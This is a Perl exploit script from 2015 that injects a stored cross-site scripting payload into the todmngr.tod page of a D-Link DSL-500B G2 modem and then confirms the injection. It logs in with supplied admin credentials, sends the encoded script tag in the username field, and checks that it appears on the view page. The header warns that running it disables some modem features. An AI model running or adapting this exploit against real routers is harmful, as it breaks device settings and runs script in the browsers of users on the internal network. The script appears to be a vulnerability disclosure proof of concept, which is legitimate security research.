#!/usr/bin/perl
#
# Date dd-mm-aaaa: 13-02-2015
# Exploit for D-Link DSL-500B G2
# Cross Site Scripting (XSS Injection) Stored in todmngr.tod
# Developed by Mauricio Corrêa
# XLabs Information Security
# WebSite: www.xlabs.com.br
#
# CAUTION!
# This exploit disables some features of the modem,
# forcing the administrator of the device, accessing the page to reconfigure the modem again,
# occurring script execution in the browser of internal network users.
#
# Use with caution!
# Use at your own risk!
#

use strict;
use warnings;
use diagnostics;
use LWP::UserAgent;
use HTTP::Request;
use URI::Escape;

	my $ip = $ARGV[0];

	my $user = $ARGV[1];

	my $pass = $ARGV[2];
		

		if (@ARGV != 3){

			print "\n";
			print "XLabs Information Security www.xlabs.com.br\n";
			print "Exploit for POC D-Link DSL-500B G2 Stored XSS Injection in todmngr.tod\n";
			print "Developed by Mauricio Correa\n";
			print "Contact: mauricio\@xlabs.com.br\n";
			print "Usage: perl $0 http:\/\/host_ip\/ user pass\n";

		}else{

			$ip = $1 if($ip=~/(.*)\/$/);

			print "XLabs Information Security www.xlabs.com.br\n";
			print "Exploit for POC D-Link DSL-500B G2 Stored XSS Injection in todmngr.tod\n";
			print "Developed by Mauricio Correa\n";
			print "Contact: mauricio\@xlabs.com.br\n";
			print "[+] Exploring $ip\/ ...\n";

			my $payload = "%3Cscript%3Ealert%28%27XLabs%27%29%3C%2fscript%3E";
			
			my $ua = new LWP::UserAgent;

			my $hdrs = new HTTP::Headers( Accept => 'text/plain', UserAgent => "XLabs Security Exploit Browser/1.0" );

			$hdrs->authorization_basic($user, $pass);
			
			chomp($ip);

			
			print "[+] Preparing exploit...\n";
			
			my $url_and_xpl = "$ip/todmngr.tod?action=add&username=$payload&mac=AA:BB:CC:DD:EE:FF&days=1&start_time=720&end_time=840";
						
			my $req = new HTTP::Request("GET",$url_and_xpl,$hdrs);

			print "[+] Prepared!\n";
			
			print "[+] Requesting and Exploiting...\n";
			
			my $resp = $ua->request($req);

			if ($resp->is_success){

			print "[+] Successfully Requested!\n";
			
			
				my $url = "$ip/todmngr.tod?action=view";
			
				$req = new HTTP::Request("GET",$url,$hdrs);

				print "[+] Checking that was explored...\n";
				
				
				my $resp2 = $ua->request($req);
				
				
				if ($resp2->is_success){

				my $resultado = $resp2->as_string;
				
							if(index($resultado, uri_unescape($payload)) != -1){
							
							print "[+] Successfully Exploited!";

							}else{
							
							print "[-] Not Exploited!";
							
							}
				}

			}else {

			print "[-] Ops!\n";
			print $resp->message;

			}


}